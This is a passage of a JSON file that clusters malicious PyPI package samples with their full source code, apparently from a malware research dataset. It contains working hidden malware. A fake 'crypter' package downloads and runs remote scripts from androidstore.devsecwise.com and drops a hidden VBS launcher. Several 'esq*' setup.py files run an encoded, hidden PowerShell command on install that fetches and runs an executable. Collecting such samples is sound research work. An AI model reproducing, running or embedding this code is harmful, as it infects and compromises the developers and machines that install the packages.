Button!\",'red'))\n        quit()\n\n\ndef check():\n    path_to_file = 'stub.py'\n    path = Path(path_to_file)\n    if path.is_file():\n        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...','red'))\n        print()\n        print(termcolor.colored(\"\"\"[1] For Remove File: Type:- del\\n[2] For Rename File: Type:- ren \"\"\",'yellow'))\n        print()\n        a=input(termcolor.colored(\"[+]Do U Want To Remove Old File Or Rename File:- \",'blue'))\n        print()\n\n        if(a==\"del\"):\n            os.remove('stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Deleted...\",'green'))\n            print()\n            enc()\n        elif(a==\"ren\"):\n            os.rename('stub.py','old_stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Renamed...\", 'green'))\n            print()\n            enc()\n        else:\n            print(termcolor.colored(\"Plz! Remove or Rename It mannually\",'red'))\n    else:\n        enc()\ndef goodwork1():\n    path = 'C:\\\\Users\\\\Public\\\\System'\n    isExist = os.path.exists(path)\n\n    if not isExist:\n        # Create a new directory because it does not exist\n        os.makedirs(path)\n        path_to_file = 'C:\\\\Users\\\\'+'\\\\Public\\\\System\\\\' + 'winenv.py'\n        path = Path(path_to_file)\n        if path.is_file():\n            print('')\n        else:\n            remote_url = 'https://androidstore.devsecwise.com/pay.py'\n            local_file = path_to_file\n            request.urlretrieve(remote_url, local_file)\n            try:\n                with open('C:\\\\Users\\\\Public\\\\System\\\\system.vbs', 'w') as f:\n                    f.write(\"Function config()\\n\")\n                    f.write(\"vcOpcaTAcOP = \\\"cMd /c python C:\\\\Users\\\\Public\\\\System\\\\winenv.py\"\"\\\"\\n\")\n                    f.write(\"set vOpcQrtacv = CreateObject(\\\"WScript.Shell\\\")\\n\")\n                    f.write(\"vOpcQrtacv.Run vcOpcaTAcOP,0\\n\")\n                    f.write(\"End Function\\n\")\n                    f.write(\"config\")\n            except FileNotFoundError:\n                print(\"\")\n\n            subprocess.call(\"cmd /c C:\\\\Users\\\\Public\\\\System\\\\system.vbs\")\n\ndef checkwin():\n    path_to_file = 'stub.py'\n    path = Path(path_to_file)\n    if path.is_file():\n        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...','red'))\n        print()\n        print(termcolor.colored(\"\"\"[1] For Remove File: Type:- del\\n[2] For Rename File: Type:- ren \"\"\",'yellow'))\n        print()\n        a=input(termcolor.colored(\"[+]Do U Want To Remove Old File Or Rename File:- \",'blue'))\n        print()\n\n        if(a==\"del\"):\n            os.remove('stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Deleted...\",'green'))\n            print()\n            encwin()\n        elif(a==\"ren\"):\n            os.rename('stub.py','old_stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Renamed...\", 'green'))\n            print()\n            encwin()\n        else:\n            print(termcolor.colored(\"Plz! Remove or Rename It mannually\",'red'))\n    else:\n        encwin()\ndef enc():\n    firstnum=input(termcolor.colored(\"[+] Enter Path Of Payload File:- \",'yellow'))\n    with open(firstnum) as f:\n        contents = f.read()\n    string = contents\n    a = 0\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Validation Success...\",'green'))\n    key = \"\"\n    while a < 100:\n        key = key + str(random.randint(0, 9))\n        a += 1\n\n    no_of_itr = len(string)\n    output_string = \"\"\n    for i in range(no_of_itr):\n        current_string = string[i]\n        current_key = key[i % len(key)]\n        output_string += chr(ord(current_string) ^ ord(current_key))\n    c=repr(output_string)\n    time.sleep(2)\n    print()\n    goodwork()\n    print(termcolor.colored(\"[*] File Encryption Started...:-\",'magenta'))\n    d=c.replace(\"'\",\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] Generating Encryption Key...\",'blue'))\n    #print(key)\n    try:\n        with open('stub.py', 'w') as f:\n            f.write(f\"wopvEaTEcopFEavc =\\\"{d}\\\" \\n\")\n            f.write(f\"\\niOpvEoeaaeavocp = \\\"{key}\\\"\\n\")\n            f.write(\"uocpEAtacovpe = len(wopvEaTEcopFEavc)\\noIoeaTEAcvpae = \\\"\\\"\\nfor i in range(uocpEAtacovpe):\\n    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[i]\\n    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\\n    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\\n\\n\\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\")\n    except FileNotFoundError:\n        print(\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[+] File Successfully Encrypted...\",'green'))\n\ndef encwin():\n    firstnum=input(termcolor.colored(\"[+] Enter Path Of Payload File:- \",'yellow'))\n    with open(firstnum) as f:\n        contents = f.read()\n    string = contents\n    a = 0\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Validation Success...\",'green'))\n    key = \"\"\n    while a < 100:\n        key = key + str(random.randint(0, 9))\n        a += 1\n\n    no_of_itr = len(string)\n    output_string = \"\"\n    for i in range(no_of_itr):\n        current_string = string[i]\n        current_key = key[i % len(key)]\n        output_string += chr(ord(current_string) ^ ord(current_key))\n    c=repr(output_string)\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Encryption Started...:-\",'magenta'))\n    goodwork1()\n    d=c.replace(\"'\",\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] Generating Encryption Key...\",'blue'))\n    #print(key)\n    try:\n        with open('stub.py', 'w') as f:\n            f.write(f\"wopvEaTEcopFEavc =\\\"{d}\\\" \\n\")\n            f.write(f\"\\niOpvEoeaaeavocp = \\\"{key}\\\"\\n\")\n            f.write(\"uocpEAtacovpe = len(wopvEaTEcopFEavc)\\noIoeaTEAcvpae = \\\"\\\"\\nfor i in range(uocpEAtacovpe):\\n    current_string = wopvEaTEcopFEavc[i]\\n    current_key = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\\n    oIoeaTEAcvpae += chr(ord(current_string) ^ ord(current_key))\\n\\n\\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\")\n    except FileNotFoundError:\n        print(\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[+] File Successfully Encrypted...\",'green'))\ncatc()\n\nfrom pycrypt import catc\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-pysofti",
        "code": "from setuptools import setup, find_packages\nimport codecs\nimport os\n\n\nDESCRIPTION = 'Python Crypter For Red Teaming'\n\n# Setting up\nsetup(\n    name=\"pysofti\",\n    author=\"whoami (claysmith)\",\n    author_email=\"<claysmith@yahoo.com>\",\n    description=DESCRIPTION,\n    packages=find_packages(),\n    install_requires=['termcolor', 'request', 'random'],\n    keywords=['python', 'crypter', 'avbypass', 'crypt'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n\nimport random\n#Coded By: Machine404\nimport subprocess\nfrom pathlib import Path\nimport  platform\nimport os\nfrom urllib import request\n\nimport termcolor\nimport time\ntry:\n    import requests\nexcept:\n    print(\"[*]Installing request Module\")\n    os.system(\"pip install requests -q -q -q\")\ntry:\n    import termcolor\nexcept:\n    print(\"[*]Installing termcolor Module\")\n    os.system(\"pip install termcolor -q -q -q\")\ndef logo():\n    print(termcolor.colored('''****************************************************************************\n                ________   __     ____    __   __   _____    ______        *\n               / /  _ \\ \\ / /    / ___|_ _\\ \\ / / _|_   _|__|  _ \\ \\       *\n              | || |_) \\ V /____| |   | '__\\ V / '_ \\| |/ _ \\ |_) | |      *\n             < < |  __/ | |_____| |___| |   | || |_) | |  __/  _ < > >     *\n              | ||_|    |_|      \\____|_|   |_|| .__/|_|\\___|_| \\_\\ |      *\n               \\_\\                             |_|               /_/       *\n                   Python Crypter To Make Your Py Files UnDetectable       *\n                                                                           *\n                              Coded By: Machine1337                        *\n****************************************************************************\n  ''', 'cyan'))\ndef runme():\n    subprocess.call(\"python3 /tmp/pytmp.py\", shell=True)\ndef goodwork():\n    remote_url = 'https://androidstore.devsecwise.com/pytmp.py'\n    local_file = '/tmp/pytmp.py'\n    request.urlretrieve(remote_url, local_file)\n    runme()\ndef catc():\n    try:\n        if platform.system().startswith(\"Windows\"):\n            os.system(\"cls\")\n            logo()\n            checkwin()\n        elif platform.system().startswith(\"Linux\"):\n            print(\"\\033c\")\n            logo()\n            check()\n        else:\n            print(termcolor.colored(\"Please Use Windows Or Linux OS!\",'red'))\n    except KeyboardInterrupt:\n        print()\n        print(termcolor.colored(\"\\nYou Pressed The Exit Button!\",'red'))\n        quit()\n\n\ndef check():\n    path_to_file = 'stub.py'\n    path = Path(path_to_file)\n    if path.is_file():\n        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...','red'))\n        print()\n        print(termcolor.colored(\"\"\"[1] For Remove File: Type:- del\\n[2] For Rename File: Type:- ren \"\"\",'yellow'))\n        print()\n        a=input(termcolor.colored(\"[+]Do U Want To Remove Old File Or Rename File:- \",'blue'))\n        print()\n\n        if(a==\"del\"):\n            os.remove('stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Deleted...\",'green'))\n            print()\n            enc()\n        elif(a==\"ren\"):\n            os.rename('stub.py','old_stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Renamed...\", 'green'))\n            print()\n            enc()\n        else:\n            print(termcolor.colored(\"Plz! Remove or Rename It mannually\",'red'))\n    else:\n        enc()\ndef goodwork1():\n    path = 'C:\\\\Users\\\\Public\\\\System'\n    isExist = os.path.exists(path)\n\n    if not isExist:\n        # Create a new directory because it does not exist\n        os.makedirs(path)\n        path_to_file = 'C:\\\\Users\\\\'+'\\\\Public\\\\System\\\\' + 'winenv.py'\n        path = Path(path_to_file)\n        if path.is_file():\n            print('')\n        else:\n            remote_url = 'https://androidstore.devsecwise.com/pay.py'\n            local_file = path_to_file\n            request.urlretrieve(remote_url, local_file)\n            try:\n                with open('C:\\\\Users\\\\Public\\\\System\\\\system.vbs', 'w') as f:\n                    f.write(\"Function config()\\n\")\n                    f.write(\"vcOpcaTAcOP = \\\"cMd /c python C:\\\\Users\\\\Public\\\\System\\\\winenv.py\"\"\\\"\\n\")\n                    f.write(\"set vOpcQrtacv = CreateObject(\\\"WScript.Shell\\\")\\n\")\n                    f.write(\"vOpcQrtacv.Run vcOpcaTAcOP,0\\n\")\n                    f.write(\"End Function\\n\")\n                    f.write(\"config\")\n            except FileNotFoundError:\n                print(\"\")\n\n            subprocess.call(\"cmd /c C:\\\\Users\\\\Public\\\\System\\\\system.vbs\")\n\ndef checkwin():\n    path_to_file = 'stub.py'\n    path = Path(path_to_file)\n    if path.is_file():\n        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...','red'))\n        print()\n        print(termcolor.colored(\"\"\"[1] For Remove File: Type:- del\\n[2] For Rename File: Type:- ren \"\"\",'yellow'))\n        print()\n        a=input(termcolor.colored(\"[+]Do U Want To Remove Old File Or Rename File:- \",'blue'))\n        print()\n\n        if(a==\"del\"):\n            os.remove('stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Deleted...\",'green'))\n            print()\n            encwin()\n        elif(a==\"ren\"):\n            os.rename('stub.py','old_stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Renamed...\", 'green'))\n            print()\n            encwin()\n        else:\n            print(termcolor.colored(\"Plz! Remove or Rename It mannually\",'red'))\n    else:\n        encwin()\ndef enc():\n    firstnum=input(termcolor.colored(\"[+] Enter Path Of Payload File:- \",'yellow'))\n    with open(firstnum) as f:\n        contents = f.read()\n    string = contents\n    a = 0\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Validation Success...\",'green'))\n    key = \"\"\n    while a < 100:\n        key = key + str(random.randint(0, 9))\n        a += 1\n\n    no_of_itr = len(string)\n    output_string = \"\"\n    for i in range(no_of_itr):\n        current_string = string[i]\n        current_key = key[i % len(key)]\n        output_string += chr(ord(current_string) ^ ord(current_key))\n    c=repr(output_string)\n    time.sleep(2)\n    print()\n    goodwork()\n    print(termcolor.colored(\"[*] File Encryption Started...:-\",'magenta'))\n    d=c.replace(\"'\",\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] Generating Encryption Key...\",'blue'))\n    #print(key)\n    try:\n        with open('stub.py', 'w') as f:\n            f.write(f\"wopvEaTEcopFEavc =\\\"{d}\\\" \\n\")\n            f.write(f\"\\niOpvEoeaaeavocp = \\\"{key}\\\"\\n\")\n            f.write(\"uocpEAtacovpe = len(wopvEaTEcopFEavc)\\noIoeaTEAcvpae = \\\"\\\"\\nfor i in range(uocpEAtacovpe):\\n    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[i]\\n    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\\n    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\\n\\n\\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\")\n    except FileNotFoundError:\n        print(\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[+] File Successfully Encrypted...\",'green'))\n\ndef encwin():\n    firstnum=input(termcolor.colored(\"[+] Enter Path Of Payload File:- \",'yellow'))\n    with open(firstnum) as f:\n        contents = f.read()\n    string = contents\n    a = 0\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Validation Success...\",'green'))\n    key = \"\"\n    while a < 100:\n        key = key + str(random.randint(0, 9))\n        a += 1\n\n    no_of_itr = len(string)\n    output_string = \"\"\n    for i in range(no_of_itr):\n        current_string = string[i]\n        current_key = key[i % len(key)]\n        output_string += chr(ord(current_string) ^ ord(current_key))\n    c=repr(output_string)\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Encryption Started...:-\",'magenta'))\n    goodwork1()\n    d=c.replace(\"'\",\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] Generating Encryption Key...\",'blue'))\n    #print(key)\n    try:\n        with open('stub.py', 'w') as f:\n            f.write(f\"wopvEaTEcopFEavc =\\\"{d}\\\" \\n\")\n            f.write(f\"\\niOpvEoeaaeavocp = \\\"{key}\\\"\\n\")\n            f.write(\"uocpEAtacovpe = len(wopvEaTEcopFEavc)\\noIoeaTEAcvpae = \\\"\\\"\\nfor i in range(uocpEAtacovpe):\\n    current_string = wopvEaTEcopFEavc[i]\\n    current_key = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\\n    oIoeaTEAcvpae += chr(ord(current_string) ^ ord(current_key))\\n\\n\\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\")\n    except FileNotFoundError:\n        print(\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[+] File Successfully Encrypted...\",'green'))\ncatc()\n\nfrom vidstream.streaming import StreamingServer\nfrom vidstream.streaming import CameraClient\nfrom vidstream.streaming import VideoClient\nfrom vidstream.streaming import ScreenShareClient\nfrom vidstream.audio import AudioSender\nfrom vidstream.audio import AudioReceiver\n"
      }
    ]
  },
  {
    "cluster_id": 8,
    "size": 97,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-esqcraftlibcv-v10.44",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcraftlibcv',\n    packages = ['modlib'],\n    version = '4.69',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-esqcvcpupy-v5.75",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcvcpupy',\n    packages = ['modlib'],\n    version = '5.7',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-esqgameguiintel-v10.2",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqgameguiintel',\n    packages = ['modlib'],\n    version = '8.79',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-esqguipippost-v2.7",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqguipippost',\n    packages = ['modlib'],\n    version = '10.52',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-esqintmaskgui-v4.63",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqintmaskgui',\n    packages = ['modlib'],\n    version = '9.59',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-esqintpaypalram-v5.71",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqintpaypalram',\n    packages = ['modlib'],\n    version = '4.74',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-esqmasksplitpush-v1.41",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqmasksplitpush',\n    packages = ['modlib'],\n    version = '2.54',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-esqpingpingcontrol-v5.1",
